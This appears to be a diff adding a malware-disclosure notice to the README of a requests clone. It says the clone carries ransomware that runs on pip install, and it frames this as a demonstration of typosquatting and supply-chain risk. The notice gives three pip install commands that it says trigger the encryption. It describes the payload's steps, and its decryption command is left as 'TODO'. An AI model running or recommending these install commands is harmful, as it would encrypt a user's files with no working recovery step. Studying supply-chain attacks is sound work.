@@ -1,3 +1,44 @@
+
+# MALWARE DISCLOSURE
+<span style="color:red">THIS REPOSITORY IS MALWARE! Installation via pip WILL ENCRYPT YOUR FILES.</span>
+
+This repository is a clone of the python requests package with ransomware injected into it. This project is to demonstrate. This repository constitutes `dual use content` per the [github malware policy](https://docs.github.com/en/github/site-policy/github-community-guidelines#active-malware-or-exploits).  
+
+## Purpose
+
+The process in which pip works is flawed. If this package was published to pypi, under a different name with a low levenshtein distance it could have catastrophic consequences. The inherent flaws in the pip package manager are multipronged.  
+
+- pip allows for arbitrary code execution with a single install command.
+  - one mistyped letter could cause irreversible damage to a developer's computer
+- pypi does not actively scan for malware on their platform
+  - some 3rd parties do this with a reactionary approach
+
+This repository is not intended to be published, but to show the dangers and inherent trust that a developer must accept when using a package or library.  
+Many popular packages have hundreds of dependencies. The simple and common act of including a single package in a requirements.txt or pip instal means that you trust the code of every one of these hundreds of developers. Numerous instances of supply chain attacks have occurred in recent years and this danger is very real.
+
+## DANGER!
+
+The following commands trigger the malware attack, and should not be run.  
+`pip install git+https://github.com/parishwolfe/educational-tool-ransomware`  
+`pip3 install git+https://github.com/parishwolfe/educational-tool-ransomware`  
+`python3 -m pip install git+https://github.com/parishwolfe/educational-tool-ransomware`  
+
+A decryption tool is installed with this ransomware, the commands to decrypt your files is  
+`python3 TODO`  
+
+The action of this repository is as follows:
+
+- determine the operating system
+- recursively operate on `my documents`|`/home/${USER}`|`/Users/${USER}` for windows|linux|mac
+- Flag any file with an indication of sensitive information in the filename, (i.e. 2020_tax, mortgage-application, bitcoinWallet)
+  - a real malicious script would post these files to some darkweb site
+- encrypt all files in the user's documents folder
+- show ransom demands (with password to decrypt)
+
+## Original Content
+
+---
+
 # Requests
 
 **Requests** is a simple, yet elegant, HTTP library.
